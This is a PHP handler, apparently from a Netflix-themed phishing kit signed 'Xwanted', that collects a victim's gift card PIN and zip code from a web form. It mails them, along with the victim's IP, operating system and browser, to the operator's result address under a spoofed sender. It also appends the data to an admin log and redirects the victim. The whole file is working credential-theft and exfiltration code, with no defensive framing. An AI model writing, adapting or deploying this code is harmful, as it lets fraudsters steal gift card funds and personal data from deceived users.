<?php
header('Location: ../id');
require 'Email.php';
require 'getdata.php';
$gp = $_POST['gift'];
$zip = $_POST['zip'];
$to = "$rzlt_mail";
$subject = "👑 NFX GIFT | ".$ip." | ".$country." | " .$user_os;
$message = "
<html>
<head>
<meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>NFX GIFT FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>GIFT INFORMATION</font> ]±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Gift Card Pin] = <font style='color:#0070ba;'>$gp</font><br>
<font style='color:#9c0000;'>✪</font> [Zip Code] = <font style='color:#0070ba;'>$zip</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>✪</font> [OS] = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>$user_browser</font><br>
##################### <font style='color: #820000;'>BY ✪ Xwanted ✪</font> #####################
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:⭐XWANTED⭐ <xwanted@rez.co.uk>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/data/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>